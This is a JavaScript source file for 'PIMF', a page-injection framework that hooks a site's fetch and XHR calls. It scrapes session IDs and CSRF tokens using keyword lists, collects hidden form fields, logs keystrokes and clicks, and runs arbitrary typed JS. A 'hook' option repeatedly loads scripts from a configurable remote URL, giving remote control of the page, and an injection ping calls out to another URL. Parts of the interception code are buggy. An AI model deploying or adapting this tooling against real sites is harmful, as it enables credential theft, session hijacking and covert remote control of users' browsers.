/*
                            P I M F

            Page Interception and Manipulation Framework
        ----------------------------------------------------


    (c) PhiXi, 2026 (github.com/phi-xi)

    License: opensource.org/license/mit

*/

const Q = ( function(){

    const
        api_name = "PIMF",
        version  = "1.62",
        config   = {
            gui:null,
            txt:null,
            url: {
                hook:null,
                ping:null
            },
            on_inject:function(){}
        };

    function request( url, method, headers, body=false ){
        return new Promise( async ( resolve, reject ) => {
            try {
                let result = false,
                req = {
                    method:     method,
                    headers:    headers
                };
                if ( body ){
                    req.body = body;
                }
                const response = await fetch( url, req );
                if ( !response.ok ){
                    throw new Error( `Response status: ${response.status}` );
                }
                const response_clone = response.clone();
                try {
                    result = await response.json();
                } catch( e ){
                    result = await response_clone.text();
                }
                resolve( result );
            } catch ( error ){
                reject( error.message );
            }
        } );
    }
    function _msg( txt, add_button ){
        let m = mk( "div",
                    "q-msg",
                    {
                        style: "font-family:"
                                + this
                                + ";"
                    },
                    txt + "<br><br>" );
        if ( add_button ){
            let b = get_button( "OK", function(){
                document.body.removeChild( m );
            } );
            b.style.marginLeft = "45%";
            m.appendChild( b );
        } else {
            m.style.textAlign = "center";
        }
        document.body.appendChild( m );
        return m;
    }
    let msg = _msg.bind( "Ubuntu" );
    function load_script( url ){
        let e = mk( "script", false, {
            src:  url,
            type: "text/javascript"
        } );
        document.body.appendChild( e );
        setTimeout( ()=>{
            document.body.removeChild( e );
        }, 3000 );
    }
    function execute( src ){
        document.body.appendChild(
            mk( "script", "", {}, src ) );
    }
    function write_html( src, append=true ){
        if ( append ){
            document.body.innerHTML += src;
        } else {
            document.body.innerHTML = src;
        }
    }
    function mk( ename, cname, attr={}, text="" ){
        let e = document.createElement( ename );
        if ( cname ){
            e.className = cname;
        }
        if ( text != "" ){
            e.innerHTML = text;
        }
        for ( let aname in attr ){
            e.setAttribute( aname,
                            attr[ aname ] );
        }
        return e;
    }
    function get_button( name, callback ){
        let b = mk( "button", "q-btn" );
        b.innerHTML = name;
        b.addEventListener( "click", callback );
        return b;
    }
    function get_checkbox( name, callback ){
        let wrap     = mk( "div", "q-checkbox-wrap q-inline" ),
            label    = mk( "label",
                            "q-label q-inline",
                            {
                                for: name
                            } ),
            checkbox = mk( "input",
                            "q-checkbox q-inline",
                            {
                                name: name,
                                type: "checkbox"
                            } );
        label.innerHTML = name;
        wrap.appendChild( checkbox );
        wrap.appendChild( label );
        checkbox.addEventListener( "change", callback );
        return wrap;
    }
    function unix_time_now(){
        return Math.round( new Date().getTime() / 1000 );
    }
    function add_to_set_array( element, array ){
        if ( array.includes( element ) ) return false;
        array.push( element );
        return true;
    }
    function recursive_search_by_keys( needles, data, callback ){
        for ( let key in data ){
            let p = data[ key ];
            if ( typeof( p ) == "object" ){
                if ( key.toLowerCase() == "session" ){
                    if ( typeof( p.id ) != "undefined"
                        && typeof( p.id ) != "object" ){
                            callback( p.id );
                            return; }
                }
                recursive_search_by_keys( needles, p, callback );
            }
            if ( needles.includes( key ) ){
                callback( p );
                return;
            }
        }
    }
    function find_sid( body_txt ){
        let data = null;
        try {
            data = JSON.parse( body_txt );
        } catch(e){
            data = new URLSearchParams( body_txt );
        }
        recursive_search_by_keys( query.session_id, data, (sid)=>{
            if ( typeof( sid ) == "string" ){
                add_to_set_array( "Session ID: " + sid.toString(),
                                  Q.data.log.credentials.session_ids );
                refresh();
            }
        } );
    }
    function find_hidden_fields(){
        let f = document.getElementsByTagName( "input" );
        for ( let i=0; i < f.length; i++ ){
            if ( f[ i ].getAttribute( "hidden" ) == "true" ){
                Q.data.log.credentials.hidden
                    .push( {
                        name: f[ i ].getAttribute( "name" ),
                        value: f[ i ].value } );
            }
        }
    }
    function make_bookmark( url ){
        const template = `<!DOCTYPE NETSCAPE-Bookmark-file-1>\n
<!-- (c) PhiXi, 2026 -->\n
<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=UTF-8">\n
<TITLE>Bookmarks</TITLE>\n
<H1>Bookmarks</H1>\n
<DL><p>\n
<DT><H3 ADD_DATE="1761338694" LAST_MODIFIED="1792293228" PERSONAL_TOOLBAR_FOLDER="true">Bookmarks bar</H3>\n
<DL><p>\n
<DT><A HREF="" ADD_DATE="1792255101">Text insert</A>\n
</DL><p>\n
</DL><p>`;
        const t = unix_time_now().toString(),
            src = template.replace( /HREF\=\"\"/g, "HREF=\"" + url + "\"" );
        return src;
    }
    function refresh(){
        box_header.innerHTML = Q.data.log.headers.join("<br>");
        box_info.innerHTML   = Q.data.log.credentials.session_ids.join("<br>");
        let k = Q.data.log.events.keys,
        t = "";
        for ( let i=0; i < k.length; i++ ){
            t += k[ i ].key + ".";
        }
        box_keylog.innerHTML = t;
    }

    function _log_click( e ){
        Q.data.log.events.clicks.push( {
            time:   unix_time_now() - init_time,
            target: e.target.nodeName,
            text:   e.target.textContent
        } );
        refresh();
    }
    function _log_keypress( e ){
        let t = unix_time_now() - init_time,
            k = e.key;
            if ( e.key == "Enter" ) k = "ENTER";
            Q.data.log.events.keys.push( {
                time:   unix_time_now(),
                key:    k,
                target: e.target.nodeName
            } );
        refresh();
    }
    function _checkbox_transparent(){
        details.style.opacity =
            this.checked ? opacity : 1;
    }
    function _checkbox_monospace(){
        let css = ".q-bar,.q-box,.q-btn,.q-input,.q-checkbox,.q-textarea,.q-msg{font-family:monospace;}",
            style = Q.mk( "style", "", {}, css );
        document.body.appendChild( style );
        this.disabled = true;
    }
    function _checkbox_interept(){
        if ( !this.checked ){
            Q.intercept.stop();
        } else {
            Q.intercept.start( (type, url, opts)=>{} );
        }
    }
    function _checkbox_lock(){
        if ( !this.checked ){
            window.onbeforeunload = null;
        } else {
            window.onbeforeunload = (e)=>{
                e.preventDefault();
            };
        }
    }
    function _checkbox_select(){
        select_active = this.checked;
    }
    function _checkbox_log(){
        window.addEventListener( "click",   _log_click );
        window.addEventListener( "keydown", _log_keypress );
        this.disabled = true;
    }
    function _checkbox_hook(){
        if ( !this.checked ){
            if ( rc !== null ){
                clearInterval( rc );
                rc = null;
            }
        } else {
            if ( rc === null ){
                rc = setInterval( ()=>{
                    load_script( url_rctrl + "?"
                        + unix_time_now().toString() );
                }, sync_rate );
            }
        }
    }
    function _button_visibility(){
        Q.gui.hide();
        Q.gui.dialog
            .toast( "Move mouse to top left corner to show PIMF" );
    }
    function _button_exit(){
        Q.exit();
    }
    function _on_inject_complete(){
        config.on_inject();
        load_script( url_ping );
    }
    function _on_active_corner( e ){
        if ( e.clientX + e.clientY < 15 ){
            Q.gui.show();
        }
    }
    function _on_page_click( e ){
        let t = e.target,
            n = t.nodeName;
        if ( select_active ){
            if ( [ "INPUT","TEXTAREA" ].includes( n ) ){
                let v = t.value;
                if ( v != "" ){
                    let id = t.getAttribute( "id" ),
                        bm = make_bookmark( "javascript:(function(){document.getElementById(&quot;"
                                                + id
                                                + "&quot;).value=&quot;"
                                                + v.replace( /\'/g, "\\&quot;" )
                                                + "&quot;;})();" ),
                        url = "data:text/html;base64,"
                                + btoa( bm );
                        lnk = Q.mk( "a", "", {
                            href:     url,
                            download: "Bookmark-TextInjector.html"
                        } );
                    lnk.click();
                }
            }
        }
    }
    function _on_cli_input( e ){
        if ( e.keyCode == 13 ){
            const
                raw = input_cli.value,
                cmd = raw.split( " " );
            if ( ["GET","POST"].includes( cmd[0] ) ){
                request( cmd[1], cmd[0], JSON.parse(cmd[2]), cmd[3] )
                .then(
                    (r)=>{
                        let s = _msg.bind( "monospace" ),
                            m = "";
                        try {
                            m = JSON.stringify( r );
                        } catch(e){
                            m = r.replace( /\&/g, "&amp;" )
                                .replace( /\</g, "&lt;" )
                                .replace( /\>/g, "&gt;" );
                        }
                        s( m, true ); },
                        (r)=>{
                            s( cmd[0]
                            + "  request to  "
                            + cmd[1]
                            + "  failed with status  "
                            + r.split( ":" )[1] );
                        } );
            } else {
                if ( cmd[0][0] == "<" ){
                    write_html( raw );
                } else {
                    execute( raw );
                }
            }
        }
    }

    function init(){
        style.innerHTML = css;
        document.body.appendChild( link );
        document.body.appendChild( style );
        let checkboxes = [
            get_checkbox( "transparent", _checkbox_transparent ),
            get_checkbox( "monospace",   _checkbox_monospace ),
            get_checkbox( "intercept",   _checkbox_interept ),
            get_checkbox( "lock",        _checkbox_lock ),
            get_checkbox( "select",      _checkbox_select ),
            get_checkbox( "log",         _checkbox_log ),
            get_checkbox( "hook",        _checkbox_hook )
        ];
        let bottons = [
            get_button( "Hide", _button_visibility ),
            get_button( "Exit", _button_exit )
        ];
        details.style.opacity = 1;
        summary.innerHTML = title;
        for ( let i=0; i < checkboxes.length; i++ )
            summary.appendChild( checkboxes[ i ] );
        for ( let i=0; i < bottons.length; i++ )
            summary.appendChild( bottons[ i ] );
        details.appendChild( summary );
        details.appendChild( box_cli );
        box_cli.appendChild( input_cli );
        details.appendChild( box_post );
        details.appendChild( box_get );
        details.appendChild( box_header );
        details.appendChild( box_info );
        details.appendChild( box_keylog );
        document.body.appendChild( details );
        box_cli.style.width     = "90vw";
        box_cli.style.height    = "10vh";
        summary.lastChild.style.backgroundColor = "var(--orange)";
        summary.lastChild.style.borderColor = "var(--orange-lite)";
        setTimeout ( _on_inject_complete, 10 );
        window.addEventListener( "mousemove",   _on_active_corner );
        window.addEventListener( "click",       _on_page_click );
        input_cli.addEventListener( "keydown",  _on_cli_input );
    }


    const
        query                         = {
                                        session_id: [
                                            "session_id","session-id",
                                            "SESS_ID","SESSION_ID",
                                            "sid","SID","SESSION-ID",
                                            "sessionID","sessionId",
                                            "sessid","sessId","sesid",
                                            "sessID","sesID","sesId", ],
                                        token: [
                                            "csrf-token","csrftoken",
                                            "csrftkn","csrftok",
                                            "csrf-tkn","csrf-tok",
                                            "csrf","token","stp-token",
                                            "st","stp-tkn","stptkn" ] },
        original_fetch_constructor    = fetch.constructor.prototype,
        original_xhr_open             = XMLHttpRequest
                                            .prototype.open,
        original_xhr_setRequestHeader = XMLHttpRequest
                                            .prototype.setRequestHeader,
        original_xhr_send             = XMLHttpRequest.prototype.send,
        url_font  = "https://fonts.googleapis.com/css?family=Ubuntu",
        tsep      = " | ",
        title     = "<span style='color:var(--green-lite);'>&Phi;&Xi;"
                        + tsep
                        + api_name
                        + "<span style='color:var(--green);font-size:0.6em;'>"
                        + tsep
                        + version
                        + "</span></span>",
        sync_rate = 5 * 1000,
        opacity   = 0.7,
        init_time = unix_time_now(),
        style     = mk( "style",    false ),
        summary   = mk( "summary",  "q-bar-title" ),
        details   = mk( "details",  "q-bar" ),
        bar_title = mk( "div",      "q-bar-title" ),
        box_cli   = mk( "div",      "q-box q-cli q-inline" ),
        input_cli = mk( "input",    "q-box q-input", {
            placeholder: "Type HTML/JS code or send HTTP request using syntax: "
                            + "<GET|POST> <url> <header_JSON> <body>"
        } ),
        box_get   = mk( "div",      "q-box q-inline" ),
        box_post  = mk( "div",      "q-box q-inline" ),
        box_header= mk( "div",      "q-box q-inline q-box-small" ),
        box_info  = mk( "div",      "q-box q-inline q-box-small" ),
        box_keylog= mk( "div",      "q-box q-inline q-box-small" ),
        link      = mk( "link",     "",
                                    {
                                        rel: "stylesheet",
                                        href: url_font } );
        const css = "";


    let url_rctrl       = config.url.hook,
        url_ping        = config.url.ping,
        locker          = null,
        rc              = null,
        proc_id         = null,
        select_active   = false,
        textblock       = false;


    init();
    find_hidden_fields();

    return {

        data: {
            log: {
                events: {
                    clicks: [],
                    keys: []
                },
                credentials: {
                    session_ids: [],
                    hidden: []
                },
                headers: []
            }
        },

        gui: {
            show: function(){
                details.style.display = "";
            },
            hide: function(){
                details.style.display = "none";
            },
            dialog: {
                message: function( txt ){
                    msg( txt, true );
                },
                msg: function( txt ){
                    msg( txt, true );
                },
                toast: function( txt, duration=3 ){
                    let m = msg( txt, false );
                    setTimeout( ()=>{
                        document.body.removeChild( m );
                    }, 1000 * duration );
                }
            },
            warn: function( txt ){}
        },

        hook: {
            get_proc_id: function(){
                return proc_id;
            },
            set_proc_id: function( pid ){
                proc_id = pid;
            }
        },

        execute: function( src ){
            execute( src );
        },
        load_script: function( url ){
            load_script( url );
        },

        intercept: {
            start: function( callback, block_request=false ){
                fetch.constructor.prototype = function( url, options ){
                    let u = url.split( "?" );
                    if ( u.length > 1 ) find_sid( url[1] );
                    callback( "FETCH", url, options );
                    let b = options.method == "GET" ? box_get : box_post;
                    b.innerHTML += "<br><div style='color:var(--cyan);font-weight:bold;'>"
                                        + options.method.toUpperCase()
                                        + "<br>"
                                        + JSON.stringify( options )
                                        + "</div> "
                                        + url;
                    if ( !block_request ){
                        original_fetch_constructor.apply( this, arguments );
                    }
                    add_to_set_array( JSON.stringify( options.headers ),
                                      Q.data.log.headers );
                    refresh();
                };
                XMLHttpRequest.prototype.open = function( method, url ){
                    callback( "XHR", url, method );
                    let u = url.split( "?" ),
                        b = method == "GET" ? box_get : box_post;
                    b.innerHTML += "<br><div style='color:var(--cyan);'><b>"
                                        + method.toUpperCase()
                                        + "</b><br>"
                                        + url
                                        + "</div> ";
                    if ( u.length > 1 ) find_sid( url[1] );
                    original_xhr_open.apply( this, arguments );
                };
                XMLHttpRequest.prototype.setRequestHeader = function( header, value ){
                    add_to_set_array( header + ": " + value,
                                      Q.data.log.headers );
                    original_xhr_setRequestHeader.apply( this, arguments );
                    refresh();
                };
                XMLHttpRequest.prototype.send = function( body ){
                    if ( body != null ){
                        box_post.innerHTML += "<div style='color:var(--white);'>"
                            + body
                            + "</div> ";
                    }
                    find_sid( body );
                    original_xhr_open.apply( this, arguments );
                };
            },
            stop: function(){
                fetch.constructor.prototype       = original_fetch_constructor;
                XMLHttpRequest.prototype.open     = original_xhr_open;
                XMLHttpRequest.prototype.send     = original_xhr_send;
                XMLHttpRequest.prototype
                                .setRequestHeader = original_xhr_setRequestHeader;
            }
        },

        request: function( url, method, headers, body=false ){
            return request( url, method, headers, body );
        },

        send: function( url, headers={} ){
            return {
                get: function(){
                    return request( url, "GET", headers, false );
                },
                post: function( data ){
                    return request( url, "POST", headers, data );
                }
            };
        },

        r: function( n ){
            return document.getElementById( n )
                || document.getElementsByClassName( n )
                || document.getElementsByTagName( n );
        },
        mk: function( ename, cname, attr={}, text="" ){
            return mk( ename, cname, attr, text );
        },

        aux: {
            delete_element: function(){},
            extract_video: function(){
                const url = document.getElementsByClassName("fp-engine")[0].getAttribute("src");
                document.write("<a id='q-link' href='" + url + "' target='_blank'>Download video</a>");
                setTimeout( ()=>{
                    document.getElementById('q-link').click();
                },1000 );
            },
            get_bookmark_html: function( url ){
                return make_bookmark( url );
            }
        },

        exit: function(){
            document.body.removeChild( details );
        }

    };

} )();
